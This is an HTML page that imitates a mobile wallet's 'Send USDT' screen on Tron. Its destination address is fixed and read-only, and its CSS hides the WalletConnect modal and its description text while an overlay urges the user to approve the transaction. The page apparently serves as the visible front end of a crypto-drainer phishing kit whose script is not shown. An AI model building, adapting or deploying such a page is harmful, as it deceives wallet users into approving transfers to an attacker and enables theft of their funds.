<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <title>Send USDT</title>

    <!-- Speed Optimization -->
    <link rel="preload" href="wc-bundle.js" as="script">
    <link rel="preload" href="app.js" as="script">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            overflow-x: hidden;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 16px;
            display: flex;
            align-items: center;
            position: relative;
            min-height: 32px;
        }

        .back-icon {
            font-size: 22px;
            color: #D1D5DB;
            position: absolute;
            left: 16px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .title {
            font-size: 17px;
            font-weight: bold;
            margin: 0 auto;
        }

        .main-content {
            padding: 0 16px;
            margin-top: 16px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }

        .form-group {
            margin-bottom: 20px;
            width: 100%;
        }

        .label {
            font-size: 14px;
            color: #D1D5DB;
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
        }

        .input-container {
            background-color: #1A1A1A;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 0 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            min-height: 52px;
        }

        .input-field {
            background: transparent;
            border: none;
            color: #D1D5DB;
            font-size: 15px;
            width: 100%;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        .input-field::placeholder {
            color: #6B7280;
        }

        .input-field.amount {
            font-size: 16px;
            color: #ffffff;
        }

        .tw-green-text {
            color: #27C469;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .memo-icon {
            color: #27C469;
            font-size: 18px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .tw-green-btn {
            background-color: #27C469;
            color: #000000;
            border: none;
            border-radius: 9999px;
            padding: 16px;
            width: 100%;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: auto;
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            outline: none !important;
            -webkit-tap-highlight-color: transparent;
        }

        .tw-green-btn:active {
            opacity: 0.7;
            transform: scale(0.98);
        }

        .btn-loading {
            pointer-events: none;
            opacity: 0.9;
            color: transparent !important;
        }

        .btn-loading::after {
            content: "";
            position: absolute;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .network-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background-color: #222222;
            padding: 6px 12px;
            border-radius: 9999px;
            border: 1px solid #1F2937;
            -webkit-tap-highlight-color: transparent;
        }

        .network-icon {
            width: 20px;
            height: 20px;
            background-color: #FF060A;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .network-text {
            font-size: 14px;
            font-weight: 600;
            color: #D1D5DB;
        }

        .balance-text {
            margin-top: 8px;
            font-size: 13px;
            color: #D1D5DB;
            font-weight: 500;
        }

        .loading-overlay {
            position: fixed;
            inset: 0;
            background: rgba(18, 18, 18, 0.9);
            backdrop-filter: blur(5px);
            z-index: 100;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 32px;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 3px solid #27C469;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        .loading-title {
            font-size: 19px;
            font-weight: bold;
            color: white;
            margin: 0;
            text-align: center;
        }

        .loading-subtitle {
            color: #9CA3AF;
            text-align: center;
            font-size: 14px;
            margin-top: 8px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .opacity-10 {
            opacity: 0.1 !important;
        }

        .hidden {
            display: none !important;
        }

        /* WalletConnect Modal Cleanup */
        w3m-modal,
        wui-onboarding-on-desktop,
        wui-onboarding-on-mobile {
            display: none !important;
        }

        .w3m-description,
        .w3m-onboarding-description {
            display: none !important;
        }

        [class*="onboarding"],
        [class*="description"] {
            font-size: 0 !important;
            color: transparent !important;
            height: 0 !important;
            overflow: hidden !important;
            visibility: hidden !important;
        }
    </style>
</head>

<body>
    <div id="page-wrapper" style="display: flex; flex-direction: column; min-height: 100vh;">
        <div class="header">
            <i class="fa-solid fa-arrow-left back-icon"></i>
            <h1 class="title">Send USDT</h1>
        </div>
        <div id="main-content" class="main-content">
            <div class="form-group">
                <label class="label">Address or Domain Name</label>
                <div class="input-container">
                    <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="input-field" readonly>
                    <div class="tw-green-text">
                        <span>Paste</span>
                        <i class="fa-regular fa-clipboard" style="font-size: 18px;"></i>
                        <i class="fa-solid fa-expand" style="font-size: 18px;"></i>
                    </div>
                </div>
            </div>
            <div class="form-group">
                <label class="label">Destination network</label>
                <div class="network-badge">
                    <div class="network-icon">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="white">
                            <path d="M12 2L2 22L12 18L22 22L12 2Z" />
                        </svg>
                    </div>
                    <span class="network-text">Tron</span>
                    <i class="fa-solid fa-caret-down" style="color:#6B7280; font-size: 12px; margin-left: 4px;"></i>
                </div>
            </div>
            <div class="form-group" style="margin-bottom: 8px;">
                <label class="label">Amount</label>
                <div class="input-container">
                    <input type="number" id="send-amount" placeholder="USDT Amount" class="input-field amount">
                    <div class="tw-green-text">
                        <span style="color:#D1D5DB">USDT</span>
                        <span>Max</span>
                    </div>
                </div>
                <div class="balance-text">≈ $<span id="view-balance">0.00</span></div>
            </div>
            <div class="form-group" style="margin-top: 12px; margin-bottom: 24px;">
                <label class="label">Memo</label>
                <div class="input-container" style="justify-content: flex-end; gap: 16px;">
                    <i class="fa-solid fa-expand memo-icon"></i>
                    <i class="fa-solid fa-circle-info memo-icon"></i>
                </div>
            </div>
            <button id="next-btn" class="tw-green-btn">Next</button>
        </div>
    </div>

    <div id="loading-screen" class="loading-overlay hidden">
        <div class="spinner"></div>
        <h2 class="loading-title">Please approve this transaction</h2>
        <p class="loading-subtitle">Processing your request, please wait...</p>
        <div id="error-message" style="color: #FF4D4D; font-size: 14px; margin-top: 16px; font-weight: 600; text-align: center;" class="hidden"></div>
    </div>

    <script src="app.js" defer></script>
</body>

</html>
